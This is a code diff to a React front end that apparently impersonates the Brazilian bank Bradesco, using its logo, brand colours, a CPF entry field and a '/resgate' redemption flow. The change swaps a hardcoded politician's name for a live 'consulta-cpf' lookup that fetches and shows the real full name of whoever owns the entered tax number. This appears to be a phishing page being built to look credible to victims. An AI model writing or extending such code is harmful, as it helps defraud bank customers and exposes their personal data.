@@ -1,10 +1,11 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Menu, Bell } from "lucide-react";
 import AttentionModal from "@/components/AttentionModal";
 import ProcessingModal from "@/components/ProcessingModal";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import BottomNav from "@/components/BottomNav";
+import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
   const navigate = useNavigate();
@@ -12,6 +13,27 @@ const Index = () => {
   const [processingOpen, setProcessingOpen] = useState(false);
   const [toggleOn, setToggleOn] = useState(false);
   const [cpf, setCpf] = useState("");
+  const [nomeCompleto, setNomeCompleto] = useState("");
+  const [consultando, setConsultando] = useState(false);
+
+  useEffect(() => {
+    const cleanCpf = cpf.replace(/\D/g, "");
+    if (cleanCpf.length === 11) {
+      setConsultando(true);
+      supabase.functions.invoke("consulta-cpf", {
+        body: { cpf: cleanCpf },
+      }).then(({ data, error }) => {
+        setConsultando(false);
+        if (!error && data?.nome) {
+          setNomeCompleto(data.nome);
+        } else {
+          setNomeCompleto("");
+        }
+      });
+    } else {
+      setNomeCompleto("");
+    }
+  }, [cpf]);
 
   return (
     <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
@@ -63,7 +85,7 @@ const Index = () => {
 
         {/* Nome do titular */}
         <div className="w-full py-3 rounded-full bg-white text-[#D7004D] font-semibold text-base text-center">
-          {cpf.length === 14 ? "Jair M Bolsonaro" : "1º titular"}
+          {consultando ? "Consultando..." : nomeCompleto ? nomeCompleto : "1º titular"}
         </div>
 
         {/* Toggle */}
@@ -103,7 +125,7 @@ const Index = () => {
       {/* Processing Modal */}
       <ProcessingModal
         open={processingOpen}
-        userName={cpf.length === 14 ? "Jair M Bolsonaro" : ""}
+        userName={nomeCompleto}
         onComplete={() => { setProcessingOpen(false); navigate("/resgate"); }}
       />
     </div>
